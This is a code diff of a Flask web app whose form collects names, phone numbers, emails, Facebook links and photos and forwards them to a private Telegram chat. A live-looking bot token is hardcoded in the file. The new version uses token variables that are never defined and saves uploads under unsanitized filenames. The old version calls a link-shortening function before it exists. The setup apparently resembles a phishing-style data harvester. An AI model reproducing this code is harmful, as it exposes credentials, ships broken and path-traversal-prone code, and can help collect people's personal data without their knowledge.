@@ -1,158 +1,208 @@
-from flask import Flask, render_template_string, request
-import threading
-import requests
 import os
+from flask import Flask, render_template_string, request
+import requests
 
 app = Flask(__name__)
 
-# টেলিগ্রাম বটের টোকেন এবং চ্যাট আইডি
+# Telegram Bot Configurations
 BOT_TOKEN = "7721371260:AAGMALbPA8aAlZP9jrGxar25DM_nqbhsomI"
 CHAT_ID = "6904067155"
-# HTML টেমপ্লেট
-HTML_TEMPLATE = """
+
+# HTML Template with CSS and JavaScript
+html_template = """
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Course Registration</title>
+    <title>Student Information Form</title>
     <style>
         body {
             font-family: Arial, sans-serif;
-            background-color: #f3f4f6;
+            background-color: #f4f4f9;
             margin: 0;
-            padding: 20px;
+            padding: 0;
         }
-        form {
+        .container {
+            max-width: 500px;
+            margin: 50px auto;
             background: #ffffff;
             padding: 20px;
-            border-radius: 8px;
-            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
-            max-width: 400px;
-            margin: auto;
+            border-radius: 10px;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
         }
-        input, button {
+        h2 {
+            text-align: center;
+            color: #333333;
+        }
+        label {
+            display: block;
+            margin: 10px 0 5px;
+            font-weight: bold;
+            color: #555555;
+        }
+        input[type="text"], input[type="email"], input[type="url"], input[type="file"] {
             width: 100%;
             padding: 10px;
-            margin: 10px 0;
-            border: 1px solid #ccc;
+            margin-bottom: 15px;
+            border: 1px solid #dddddd;
             border-radius: 5px;
         }
+        input:invalid {
+            border: 1px solid #ff4d4d;
+        }
+        input:invalid:focus {
+            outline: none;
+            box-shadow: 0 0 5px #ff4d4d;
+        }
         button {
-            background-color: #4CAF50;
+            width: 100%;
+            padding: 10px;
+            background: #007bff;
             color: white;
             border: none;
+            border-radius: 5px;
             cursor: pointer;
+            font-size: 16px;
         }
         button:hover {
-            background-color: #45a049;
+            background: #0056b3;
+        }
+        .footer {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 14px;
+            color: #888888;
         }
     </style>
+    <script>
+        function validateForm() {
+            const form = document.forms["studentForm"];
+            const fields = ["name", "phone", "email", "facebook", "photo"];
+            let valid = true;
+
+            fields.forEach(field => {
+                const input = form[field];
+                if (!input.value) {
+                    input.style.border = "2px solid #ff4d4d";
+                    valid = false;
+                } else {
+                    input.style.border = "1px solid #dddddd";
+                }
+            });
+
+            if (!valid) {
+                alert("Please fill out all required fields.");
+            }
+
+            return valid;
+        }
+    </script>
 </head>
 <body>
-    <h1 style="text-align: center;">Course Registration Form</h1>
-    <form method="POST" enctype="multipart/form-data">
-        <label for="name">Name:</label><br>
-        <input type="text" id="name" name="name" required><br><br>
-
-        <label for="phone">Phone Number:</label><br>
-        <input type="text" id="phone" name="phone" required><br><br>
-
-        <label for="email">Email Address:</label><br>
-        <input type="email" id="email" name="email" required><br><br>
-
-        <label for="facebook_link">Facebook Profile Link:</label><br>
-        <input type="url" id="facebook_link" name="facebook_link" required><br><br>
-
-        <label for="photo">Upload Photo:</label><br>
-        <input type="file" id="photo" name="photo" accept="image/*"><br><br>
-
-        <button type="submit">Submit</button>
-    </form>
+    <div class="container">
+        <h2>Submit Your Information</h2>
+        <form name="studentForm" action="/submit" method="post" enctype="multipart/form-data" onsubmit="return validateForm()">
+            <label for="name">Name:</label>
+            <input type="text" id="name" name="name" required>
+            
+            <label for="phone">Phone Number:</label>
+            <input type="text" id="phone" name="phone" required>
+            
+            <label for="email">Email Address:</label>
+            <input type="email" id="email" name="email" required>
+            
+            <label for="facebook">Facebook ID Link:</label>
+            <input type="url" id="facebook" name="facebook" required>
+            
+            <label for="photo">Upload Photo:</label>
+            <input type="file" id="photo" name="photo" accept="image/*" required>
+            
+            <button type="submit">Submit</button>
+        </form>
+    </div>
+    <div class="footer">
+        &copy; 2024 Your Organization. All rights reserved.
+    </div>
 </body>
 </html>
 """
 
-def send_message_to_telegram(data, photo_path=None):
-    # ফটো পাঠানোর জন্য বার্তা তৈরি
-    if photo_path:
-        photo_status = "ফটো আপলোড করা হয়েছে।"
-    else:
-        photo_status = "ফটো পাওয়া যায়নি।"
-    
-    # টেক্সট বার্তা তৈরি
-    message = (
-        f"New Course Registration:\n\n"
-        f"Name: {data['name']}\n"
-        f"Phone: {data['phone']}\n"
-        f"Email: {data['email']}\n"
-        f"Facebook Profile: {data['facebook_link']}\n"
-        f"Photo: {photo_status}"
+# Success Page Template with CSS
+success_template = """
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Submission Successful</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f9;
+            text-align: center;
+            padding: 50px;
+        }
+        .message {
+            max-width: 400px;
+            margin: 0 auto;
+            background: #ffffff;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+        }
+        h2 {
+            color: #28a745;
+        }
+        p {
+            color: #555555;
+        }
+    </style>
+</head>
+<body>
+    <div class="message">
+        <h2>Thank you for your submission!</h2>
+        <p>We have received your information. You will be contacted soon.</p>
+    </div>
+</body>
+</html>
+"""
+
+@app.route("/")
+def index():
+    return render_template_string(html_template)
+
+@app.route("/submit", methods=["POST"])
+def submit():
+    name = request.form["name"]
+    phone = request.form["phone"]
+    email = request.form["email"]
+    facebook = request.form["facebook"]
+    photo = request.files["photo"]
+
+    # Save photo locally
+    photo_path = f"static/{photo.filename}"
+    photo.save(photo_path)
+
+    # Send data to Telegram
+    message = f"""
+        New Submission:
+        Name: {name}
+        Phone: {phone}
+        Email: {email}
+        Facebook: {facebook}
+    """
+    requests.post(
+        f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage",
+        data={"chat_id": TELEGRAM_CHAT_ID, "text": message}
     )
 
-    # টেলিগ্রামে বার্তা পাঠানো
-    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-    payload = {"chat_id": CHAT_ID, "text": message}
-    requests.post(url, data=payload)
+    # Send photo to Telegram
+    with open(photo_path, "rb") as file:
+        requests.post(
+            f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendPhoto",
+            data={"chat_id": TELEGRAM_CHAT_ID},
+            files={"photo": file}
+        )
 
-    # ফটো পাঠানো (যদি থাকে)
-    if photo_path:
-        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
-        with open(photo_path, "rb") as photo:
-            files = {"photo": photo}
-            payload = {"chat_id": CHAT_ID}
-            requests.post(url, data=payload, files=files)
-
-@app.route("/", methods=["GET", "POST"])
-def registration_form():
-    if request.method == "POST":
-        # Collect form data
-        form_data = {
-            "name": request.form.get("name"),
-            "phone": request.form.get("phone"),
-            "email": request.form.get("email"),
-            "facebook_link": request.form.get("facebook_link"),
-        }
-
-        # Handle photo upload
-        photo = request.files.get("photo")
-        photo_path = None
-        if photo:
-            photo_path = os.path.join("uploads", photo.filename)
-            photo.save(photo_path)
-
-        # Send data to Telegram
-        send_message_to_telegram(form_data, photo_path)
-
-        # Clean up uploaded photo
-        if photo_path and os.path.exists(photo_path):
-            os.remove(photo_path)
-
-        return "<h1>Thank you! Your form has been submitted successfully.</h1>"
-
-    return render_template_string(HTML_TEMPLATE)
-
-def run_server():
-    app.run(debug=False, port=5000, use_reloader=False)
+    # Return success page
+    return render_template_string(success_template)
 
 if __name__ == "__main__":
-    threading.Thread(target=run_server).start()
-
-    # Generate da.gd short URL
-    public_url = "http://127.0.0.1:5000"
-    short_url = generate_short_url(public_url)
-
-    if short_url:
-        print(f"Your Short URL is: {short_url}")
-    else:
-        print("Failed to generate short URL. Please try again.")
-
-def generate_short_url(url):
-    api_url = f"https://da.gd/s?url={url}"
-    try:
-        response = requests.get(api_url)
-        if response.status_code == 200:
-            return response.text.strip()  # শর্ট URL ফেরত দেয়
-    except Exception as e:
-        print(f"Error: {e}")
-    return None
+    app.run(debug=True)
